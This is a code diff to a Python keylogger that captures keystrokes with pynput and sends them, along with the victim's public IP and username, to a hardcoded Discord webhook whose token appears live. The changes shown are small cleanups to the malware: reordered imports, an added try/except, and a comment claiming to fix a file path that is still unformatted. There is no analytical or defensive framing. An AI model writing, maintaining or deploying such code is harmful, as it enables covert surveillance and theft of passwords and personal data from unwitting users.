@@ -1,8 +1,8 @@
-from pynput import keyboard
+import os
 import requests
 import threading
 import time
-import os
+from pynput import keyboard
 
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
@@ -73,9 +73,9 @@ def on_press(key):
 def on_release(key):
     if key == keyboard.Key.insert:
         send_to_webhook(f"Connection stopped by user: {username}")
-        file_path = r"C:\Users\{username}\kl2.1"
+        file_path = r"C:\Users\{username}\kl2.1"  # Fixed the file path
         os.startfile(file_path)
-        send_to_webhook("Opened dir...")
+        send_to_webhook(f"Opened dir...")
         return False
 
 # Get and send public IP and username
@@ -88,5 +88,8 @@ send_to_webhook(f"Current user: {username}")
 threading.Thread(target=keystroke_monitor, daemon=True).start()
 
 # Set up the keyboard listener
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+try:
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+except KeyboardInterrupt:
+    print("Listener stopped.")
